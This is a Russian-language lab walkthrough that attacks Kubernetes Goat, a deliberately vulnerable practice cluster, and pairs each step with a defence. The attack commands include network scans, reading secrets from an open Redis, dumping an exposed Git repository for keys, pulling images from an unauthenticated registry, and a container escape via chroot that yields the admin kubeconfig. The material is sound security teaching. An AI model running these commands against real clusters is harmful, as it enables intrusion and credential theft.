# Устанавливаем стенд
## Docker
Для Linux или внутри windows subsystem for linux
```bash
curl -sSL https://get.docker.com/ | sh
```
Иначе Docker-desktop
https://www.docker.com/products/docker-desktop/

## Ставим kind
https://kind.sigs.k8s.io/docs/user/quick-start/#installation

Чтобы установить k8s-goat адекватно на kind нужно пробросить дополнительный порт для доступа к NodePort - особенность Kind.

Для установки нужно:
```bash
cat << EOF | kind create cluster --config=-
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  extraPortMappings:
  - containerPort: 30003
    hostPort: 30003
    protocol: TCP
EOF
```
Далее ждём минуту пока поднимется кластер.

## Устанавливаем kubectl
https://kubernetes.io/docs/tasks/tools/

## Устанавливаем k9s
https://webinstall.dev/k9s/

## Устанавливаем сам goat:
```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash ./setup-kubernetes-goat.sh
bash ./access-kubernetes-goat.sh
```
Далее ждём перехода всех контейнеров в статус Ready.

# Атакуем кластер
## Сканируем сеть (K07: Missing Network Segmentation Controls, K08: Secrets Management Failures)

Давайте поищем порты редиса 6379:
Для этого:
```bash
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
ip a
nmap -p 6379 10.244.0.0/24 | grep open -B 4 #Сеть может быть другой
```

Мы видим открытый Redis:
Подключаемся и забираем флаг
```bash
redis-cli -h 10.244.0.1
KEYS *
GET SECRETSTUFF
```

Почему так просто? По-умолчанию нет изоляции по сети. За сеть в Kubernetes отвечает CNI. Мы с вами не заметили, но kind сам установил такой плагин - его под:

```bash
kubectl describe pod $(kubectl get pods --no-headers -o custom-columns=":metadata.name" -n kube-system | grep "kindnet") -n kube-system
```

По-умолчанию, kubernetes не изолирует сетевые взаимодействия. И не представляет плагин CNI, на который ложится логика реализации сетевого взаимодействия, в том числе файерволинг.

Для того, чтобы изоляция работала, нужно создать политику. Для этого воспользуемся специальным универсальным API и создадим network policy:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: goat-nsp
spec:
  podSelector: {}
  ingress:
    - from:
        - podSelector: {}
  egress:
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - port: 53
          protocol: UDP
    - to:
        - podSelector: {}
```

Она разрешит только трафик внутри неймспейса контейнера и DNS трафик в кластере.

Настройка зависит от API, который есть в k8s и в реализации самого CNI, например для CNI Cillium есть некоторые расширенные возможности, например возможность фильтрации по FQDN, возможность реализации L7 политик и создание clusterwide политик, т.к наш пример работает только в namespace default.
А ещё есть прекрамный инструмент https://editor.networkpolicy.io/?id=0PPZfAAjQvVBoLL2 который поможет разобраться с написание политик.

Применим политику и убедимся, что доступа больше нет.
```bash
cat << EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: goat-nsp
spec:
  podSelector: {}
  ingress:
    - from:
        - podSelector: {}
  egress:
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - port: 53
          protocol: UDP
    - to:
        - podSelector: {}
EOF
```
## Враг внутри (K02: Supply Chain Vulnerabilities)
Просканируем всю сеть
```bash
nmap 10.244.0.0/24 | grep open -B 4
```
На самом деле не обязательно сканировать, kubernetes вежливо всё собирает для нас сам. Давайте выполним команду env.
```bash
env
```

Мы видим вывод в переменную адресов многих сервисов, давайте попробуем зайти на следующий:
```bash
curl http://10.244.0.7:3000
```
Похоже на сайт с кодом.
Не будем погружаться в особенности фазинга сайтов через тотже owasp zap (можете сделать это локально дома), но попробуем найти конфиг репозитория по пути:
```bash
curl  http://10.96.140.16:3000/.git/config
```
Ага. Есть репозиторий, давайте его скачаем
```bash
git clone https://github.com/internetwache/GitTools.git

./GitTools/Dumper/gitdumper.sh http://10.96.140.16:3000/.git/ code-app

trufflehog code-app/
```

Заботливо подготовленный заранее trufflehog нашёл ключ, но можно достичь этого и просто через git log, git show d7c173ad183c574109cd5c4c648ffe551755b576

## Ну поправили это, а что ещё? (K02: Supply Chain Vulnerabilities, CICD-SEC-7)

У нас в nmap было не только уязвимое веб приложение был ещё порт 5000. Что там?
```bash
curl http://10.244.0.12:5000/v2/_catalog
```
А там какие-то образы, которые мы получили без аутентификации.
Давайте его изучим?

```bash
curl http://10.244.0.12:5000/v2/madhuakula/k8s-goat-users-repo/manifests/latest
```

grep -i key и мы видим GPG ключ и токен-флаг.

Почему так? По умолчанию в registry v2 не реализована аутентификация. В конфиге можно включить Basic и Token (jwt). Можно реализовать самому, а можно взять Jfrog, Nexus, Gitlab, Harbor.

А как с этим бороться?
Hadolint - https://github.com/hadolint/hadolint
Checkov - https://github.com/bridgecrewio/checkov
trivy - https://github.com/aquasecurity/trivy

## Убегаем (K01: Insecure Workload Configurations, K03: Overly Permissive RBAC Configurations)

Давайте посмотрим, что ещё есть интересного.
Снова сделаем env и найдём контейнер system-monitor
```
env
```

```bash
curl http://10.244.0.7:8080
```

Вывод говорит нам, что это gotty для которого есть клиент - ставим и подключаемся. Мы в терминале

```bash
apk add go
go get github.com/moul/gotty-client/cmd/gotty-client
go/bin/gotty-client --v2 http://10.244.0.7:8080/
```

Делаем df -h или capsh --print и видим что много подов и маун /host-system. Подключимся к нему.

```bash
chroot /host-system bash

#Если не получится со стандартным кубконфигом
cp /etc/kuberntetes/admin.conf /root/.kube/config
```

Или пробуем получить доступ к кластеру Kubernetes:
```bash
kubectl --kubeconfig=/etc/kubernetes/admin.conf auth whoami
```

Видим, что мы админы. На этом всё.

## Огласите весь список пожалуйста
Раз уж мы получили доступ к админ токену, то почему бы нам не посмотреть список всех уязвимостей в кластере.
Сохраним конфиг админа из /etc/kuberntetes/admin.conf ну или нет, т.к это тот же конфиг, что и у нас на ноде =)
Для выполнения можно выйти из контейнера и провести операцию прямо на вашем ноутбуке.

Установим checkov.
```bash
https://github.com/bridgecrewio/checkov?tab=readme-ov-file#installation
```

И запустим
```bash
git clone https://github.com/bridgecrewio/checkov.git
cd checkov/kubernetes
mkdir data
bash ./run_checkov.sh
```

